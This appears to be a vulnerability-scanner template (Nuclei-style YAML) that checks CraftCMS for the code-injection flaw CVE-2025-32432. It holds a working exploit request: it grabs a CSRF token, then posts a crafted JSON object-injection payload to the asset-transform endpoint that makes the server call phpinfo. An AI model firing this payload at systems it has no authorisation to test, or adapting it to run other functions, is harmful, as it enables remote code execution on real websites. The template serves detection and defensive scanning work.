id: CraftCMS-CVE-2025-32432-CodeInjection

info:
  name: CraftCMS-CVE-2025-32432-CodeInjection
  author: iSee857
  severity: critical

http:
  - raw:
    - |
      GET /index.php?p=admin/dashboard HTTP/1.0
      Host: 

    - |
      POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.0
      Host: 
      Content-Type: application/json
      X-CSRF-Token: 

      {"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}}}

    redirects: true

    extractors:
    - type: xpath
      name: csrf-token
      attribute: value
      internal: true
      xpath:
        - //input[@type="hidden" and @name="CRAFT_CSRF_TOKEN"]

    matchers:
      - type: word
        part: body
        words:
          - 'If you did not receive a copy of the PHP license'